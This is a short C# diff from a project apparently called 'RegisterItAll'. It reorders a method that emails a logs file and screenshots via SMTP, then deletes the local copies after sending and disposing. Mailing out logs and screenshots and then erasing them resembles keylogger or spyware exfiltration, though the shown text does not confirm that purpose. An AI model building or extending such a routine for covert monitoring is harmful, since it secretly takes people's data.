@@ -43,16 +43,14 @@ namespace RegisterItAll.Services
 
             message.To.Add(emailAddress);
 
-            string logs = FilesManager.GetLogsFile();
-            message.Attachments.Add(new Attachment(logs));
-            FilesManager.RemoveLogsFile();
+            string logsFile = FilesManager.GetLogsFile();
+            message.Attachments.Add(new Attachment(logsFile));
 
             IEnumerable<string> screenshots = FilesManager.GetScreenshots();
             foreach (string screenshot in screenshots)
             {
                 message.Attachments.Add(new Attachment(screenshot));
             }
-            FilesManager.RemoveScreenshots(screenshots);
 
             SmtpClient client = new SmtpClient()
             {
@@ -63,6 +61,12 @@ namespace RegisterItAll.Services
             };
 
             client.Send(message);
+
+            message.Dispose();
+            client.Dispose();
+
+            FilesManager.RemoveLogsFile(logsFile);
+            FilesManager.RemoveScreenshots(screenshots);
         }
     }
 }
